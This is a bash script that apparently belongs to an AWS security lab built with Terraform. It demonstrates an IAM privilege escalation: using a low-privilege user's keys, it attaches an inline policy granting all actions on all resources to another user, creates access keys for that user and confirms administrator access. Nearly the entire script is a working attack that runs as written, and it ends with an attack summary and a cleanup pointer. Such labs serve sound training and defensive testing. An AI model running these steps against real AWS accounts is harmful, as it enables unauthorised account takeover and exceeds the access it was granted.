#!/bin/bash

# Demo script for iam:PutUserPolicy + iam:CreateAccessKey privilege escalation
# This scenario demonstrates how a user with PutUserPolicy and CreateAccessKey
# permissions on another user can escalate to admin access

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-iam-018-to-admin-starting-user"
TARGET_USER="pl-prod-iam-018-to-admin-target-user"
ADMIN_POLICY_NAME="admin-escalation"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PutUserPolicy + CreateAccessKey Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_018_iam_putuserpolicy_iam_createaccesskey.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
TARGET_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.target_user_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Target user: $TARGET_USER_NAME"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify starting user lacks admin access
echo -e "${YELLOW}Step 4: Verifying starting user lacks admin access${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Verify target user's current permissions
echo -e "${YELLOW}Step 5: Checking target user's current permissions${NC}"
echo "Getting target user details: $TARGET_USER_NAME"
aws iam get-user --user-name $TARGET_USER_NAME --query 'User.[UserName,Arn]' --output table

echo "Listing target user's current inline policies:"
CURRENT_POLICIES=$(aws iam list-user-policies --user-name $TARGET_USER_NAME --query 'PolicyNames' --output text)
echo "Current policies: $CURRENT_POLICIES"
echo -e "${GREEN}✓ Target user has limited permissions${NC}\n"

# Step 6: Add admin policy to target user
echo -e "${YELLOW}Step 6: Adding admin inline policy to target user${NC}"
echo "This is the privilege escalation vector..."
echo "Creating temporary admin policy document..."

# Create temporary policy file
POLICY_FILE="/tmp/admin-escalation-policy.json"
cat > $POLICY_FILE <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
EOF

echo "Adding admin policy '$ADMIN_POLICY_NAME' to user $TARGET_USER_NAME"
aws iam put-user-policy \
    --user-name $TARGET_USER_NAME \
    --policy-name $ADMIN_POLICY_NAME \
    --policy-document file://$POLICY_FILE

echo -e "${GREEN}✓ Successfully added admin policy to target user${NC}\n"

# Wait for policy to propagate
echo -e "${YELLOW}Waiting 15 seconds for IAM policy to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ Policy propagated${NC}\n"

# Step 7: Create access keys for target user
echo -e "${YELLOW}Step 7: Creating access keys for target user${NC}"
echo "Creating access keys for: $TARGET_USER_NAME"

KEY_OUTPUT=$(aws iam create-access-key --user-name $TARGET_USER_NAME --output json)
NEW_ACCESS_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.AccessKeyId')
NEW_SECRET_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.SecretAccessKey')

echo "Created access key: $NEW_ACCESS_KEY"
echo -e "${GREEN}✓ Successfully created access keys${NC}\n"

# Wait for keys to initialize
echo -e "${YELLOW}Waiting 15 seconds for access keys to initialize...${NC}"
sleep 15
echo -e "${GREEN}✓ Keys initialized${NC}\n"

# Step 8: Switch to target user credentials
echo -e "${YELLOW}Step 8: Switching to target user credentials${NC}"
unset AWS_SESSION_TOKEN
export AWS_ACCESS_KEY_ID=$NEW_ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_KEY
export AWS_REGION=$AWS_REGION

# Verify new identity
TARGET_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $TARGET_IDENTITY"
echo -e "${GREEN}✓ Now using target user credentials${NC}\n"

# Step 9: Verify administrator access
echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER"
echo "2. Added admin inline policy to: $TARGET_USER_NAME"
echo "3. Created access keys for: $TARGET_USER_NAME"
echo "4. Authenticated as: $TARGET_USER_NAME"
echo "5. Achieved: Administrator access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (PutUserPolicy) → $TARGET_USER_NAME → (CreateAccessKey) → Authenticate as $TARGET_USER_NAME → Admin"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Admin inline policy '$ADMIN_POLICY_NAME' on $TARGET_USER_NAME"
echo "- Access key: $NEW_ACCESS_KEY"
echo "- Temporary policy file: $POLICY_FILE"

echo -e "\n${RED}⚠ Warning: Target user now has administrative permissions${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
